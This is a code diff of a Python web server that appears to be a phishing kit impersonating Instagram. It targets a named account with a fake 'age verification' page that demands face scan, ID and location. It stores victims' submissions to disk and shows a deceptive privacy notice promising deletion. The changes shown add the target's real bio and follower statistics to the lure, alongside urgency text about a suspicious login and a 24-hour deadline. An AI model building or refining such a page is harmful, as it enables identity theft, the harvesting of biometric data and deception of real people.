@@ -2432,14 +2205,10 @@ def submit_complete_verification():
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"verification_summary_{target_username}_{session_id}_{timestamp}.json"
             file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
-            
-            # Add system info
             data['received_at'] = datetime.now().isoformat()
             data['server_timestamp'] = timestamp
-            
             with open(file_path, 'w') as f:
                 json.dump(data, f, indent=2)
-            
             print(f"Saved complete verification summary for {target_username}: {filename}")
             return jsonify({"status": "success", "message": "Verification complete"}), 200
         else:
@@ -2463,36 +2232,17 @@ def privacy_policy():
                 background-color: #000;
                 color: #fff;
             }
-            h1 { 
-                color: #405DE6; 
-                margin-bottom: 30px;
-            }
-            h2 {
-                color: #833AB4;
-                margin-top: 30px;
-                margin-bottom: 15px;
-            }
-            .container {
-                background-color: #121212;
-                padding: 30px;
-                border-radius: 12px;
-                border: 1px solid #363636;
-            }
-            ul {
-                padding-left: 20px;
-                margin: 15px 0;
-            }
-            li {
-                margin-bottom: 10px;
-                line-height: 1.5;
-            }
+            h1 { color: #405DE6; margin-bottom: 30px; }
+            h2 { color: #833AB4; margin-top: 30px; margin-bottom: 15px; }
+            .container { background-color: #121212; padding: 30px; border-radius: 12px; border: 1px solid #363636; }
+            ul { padding-left: 20px; margin: 15px 0; }
+            li { margin-bottom: 10px; line-height: 1.5; }
         </style>
     </head>
     <body>
         <div class="container">
             <h1>Instagram Age Verification Privacy Notice</h1>
             <p>This verification process is designed to ensure compliance with age restrictions and community safety standards.</p>
-            
             <h2>Data Collection</h2>
             <p>We collect the following data during verification:</p>
             <ul>
@@ -2502,7 +2252,6 @@ def privacy_policy():
                 <li>Location data (for regional compliance and security)</li>
                 <li>Device information (for fraud prevention)</li>
             </ul>
-            
             <h2>Data Usage</h2>
             <p>Your data is used solely for:</p>
             <ul>
@@ -2511,10 +2260,8 @@ def privacy_policy():
                 <li>Regional content restrictions enforcement</li>
                 <li>Account security enhancement</li>
             </ul>
-            
             <h2>Data Retention</h2>
             <p>All verification data is automatically encrypted and permanently deleted within 30 days of successful verification completion.</p>
-            
             <h2>Security Measures</h2>
             <ul>
                 <li>End-to-end encryption for all data transmission</li>
@@ -2522,7 +2269,6 @@ def privacy_policy():
                 <li>Regular security audits and compliance checks</li>
                 <li>No sharing with third parties for marketing purposes</li>
             </ul>
-            
             <h2>Your Rights</h2>
             <p>You have the right to:</p>
             <ul>
@@ -2538,7 +2284,6 @@ def privacy_policy():
 if __name__ == '__main__':
     check_dependencies()
     
-    # Get verification settings from user
     VERIFICATION_SETTINGS = get_verification_settings()
     
     log = logging.getLogger('werkzeug')
@@ -2551,6 +2296,10 @@ if __name__ == '__main__':
     print("INSTAGRAM VERIFICATION PAGE")
     print("="*60)
     print(f"[+] Target Username: @{VERIFICATION_SETTINGS['target_username']}")
+    print(f"[+] Bio: {VERIFICATION_SETTINGS['bio']}")
+    print(f"[+] Posts: {VERIFICATION_SETTINGS['post_count']}")
+    print(f"[+] Followers: {VERIFICATION_SETTINGS['follower_count']}")
+    print(f"[+] Following: {VERIFICATION_SETTINGS['following_count']}")
     
     if VERIFICATION_SETTINGS.get('profile_picture'):
         print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
@@ -2578,7 +2327,6 @@ if __name__ == '__main__':
     print("\n[+] Starting server...")
     print("[+] Press Ctrl+C to stop.\n")
     
-    # Terminal prompt for user
     print("="*60)
     print("TERMINAL PROMPT FOR USER")
     print("="*60)
@@ -2588,7 +2336,7 @@ if __name__ == '__main__':
         print(f"🖼️  Profile: Using profile picture from account")
     else:
         print(f"👤 Profile: Default account avatar")
-    print(f"📊 Stats: {random.randint(100, 999)} posts • {random.randint(1000, 9999)} followers • {random.randint(500, 5000)} following")
+    print(f"📊 Stats: {VERIFICATION_SETTINGS['post_count']} posts • {VERIFICATION_SETTINGS['follower_count']} followers • {VERIFICATION_SETTINGS['following_count']} following")
     print(f"🔒 Reason: Suspicious login attempt detected")
     print(f"⏰ Time limit: Complete within 24 hours")
     print(f"📍 Required: Face scan, ID verification, and location check")
